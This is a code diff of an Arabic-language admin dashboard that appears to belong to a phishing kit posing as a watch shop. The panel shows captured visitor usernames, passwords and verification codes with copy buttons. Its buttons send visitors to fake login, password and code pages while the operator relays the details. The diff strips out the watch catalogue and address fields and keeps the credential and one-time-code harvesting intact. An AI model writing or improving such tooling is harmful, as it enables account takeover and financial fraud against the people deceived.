@@ -261,7 +261,6 @@
     <h2>إعادة توجيه الزائر</h2>
     <div class="redirect-options">
       <button onclick="doRedirect('index.html')">الصفحة الرئيسية</button>
-      <button onclick="doRedirect('colors.html')">صفحة اختيار الألوان</button>
       <button onclick="doRedirect('order.html')">صفحة بيانات الطلب</button>
       <button onclick="doRedirect('login.html')">صفحة تسجيل الدخول</button>
       <button onclick="doRedirect('password.html')">صفحة الرمز السري</button>
@@ -270,20 +269,8 @@
 </div>
 
 <script>
-const watches = [
-  {img:"images/6.png",name:"أحمر جريء"},{img:"images/3.png",name:"فضي أنيق"},
-  {img:"images/2.png",name:"ذهبي فاخر"},{img:"images/1.png",name:"أسود كلاسيكي"},
-  {img:"images/4.png",name:"برتقالي زاهي"},{img:"images/5.png",name:"أزرق ملكي"},
-  {img:"images/7.png",name:"أخضر عسكري"},{img:"images/8.png",name:"وردي ناعم"},
-  {img:"images/9.png",name:"بنفسجي غامق"},{img:"images/10.png",name:"أبيض نقي"},
-  {img:"images/11.png",name:"بني ترابي"},{img:"images/12.png",name:"وردي مغبر"},
-  {img:"images/13.png",name:"تركوازي"},{img:"images/14.png",name:"كحلي"},
-  {img:"images/15.png",name:"نعناعي"},{img:"images/16.png",name:"أصفر مشرق"},
-  {img:"images/17.png",name:"مرجاني"},{img:"images/18.png",name:"لافندر"}
-];
-
 const pageLabels = {
-  "index":"الرئيسية","colors":"الألوان","order":"صفحة الطلب",
+  "index":"الرئيسية","order":"صفحة الطلب",
   "login":"تسجيل الدخول","password":"الرمز السري",
   "waiting":"جاري التحقق","code":"رمز التحقق","code-waiting":"تحقق الرمز",
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
@@ -362,24 +349,18 @@ async function loadOrders() {
   }
 
   let html = `<table><thead><tr>
-    <th>العميل</th><th>الولاية</th><th>اللون</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
+    <th>العميل</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
   </tr></thead><tbody>`;
 
   orders.forEach(o => {
-    const w = (o.watch_index !== null && o.watch_index !== undefined && watches[o.watch_index])
-      ? watches[o.watch_index] : null;
-    const watchImg = w ? w.img : "images/6.png";
     const statusClass = o.status || "pending";
     const pageName = pageLabels[o.current_page] || o.current_page || "—";
     const date = o.created_at ? new Date(o.created_at).toLocaleDateString("ar-EG",{day:"numeric",month:"short"}) : "—";
 
     html += `<tr>
       <td><div class="td-user">
-        <div class="td-watch"><img src="${watchImg}" alt=""></div>
         <div><div class="td-name">${o.name}</div><div class="td-phone">${o.phone}</div></div>
       </div></td>
-      <td style="font-size:13px">${o.wilaya||"—"}</td>
-      <td style="font-size:13px">${o.watch_color||"—"}</td>
       <td><div class="td-login-wrap"><span class="td-login">${o.login_username||"—"}</span>${o.login_username?`<button class="copy-btn" onclick="copyText(this,'${o.login_username}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><div class="td-login-wrap"><span class="td-login">${o.login_password||"—"}</span>${o.login_password?`<button class="copy-btn" onclick="copyText(this,'${o.login_password}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><div class="td-login-wrap"><span class="td-login" style="${o.verification_code?'color:#1565c0':''}">${o.verification_code||"—"}</span>${o.verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
@@ -403,20 +384,11 @@ function showDetails(id) {
   if (!o) return;
   currentOrderId = id;
 
-  const w = (o.watch_index !== null && o.watch_index !== undefined && watches[o.watch_index])
-    ? watches[o.watch_index] : null;
-
-  document.getElementById("modalWatch").innerHTML = w
-    ? `<img src="${w.img}" alt="${w.name}"><div class="color-name">${w.name}</div>`
-    : `<div class="color-name">${o.watch_color || "لم يتم الاختيار"}</div>`;
+  document.getElementById("modalWatch").innerHTML = '';
 
   let detailsHtml = `
     <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name}</div></div>
     <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone}</div></div>
-    <div class="detail-item"><div class="lbl">البريد الإلكتروني</div><div class="val">${o.email}</div></div>
-    <div class="detail-item"><div class="lbl">الولاية</div><div class="val">${o.wilaya}</div></div>
-    <div class="detail-item detail-full"><div class="lbl">العنوان</div><div class="val">${o.address}</div></div>
-    <div class="detail-item"><div class="lbl">لون الساعة</div><div class="val">${o.watch_color||"—"}</div></div>
     <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${statusLabels[o.status]||o.status}</div></div>
     <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
     <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${new Date(o.created_at).toLocaleString("ar-EG")}</div></div>`;
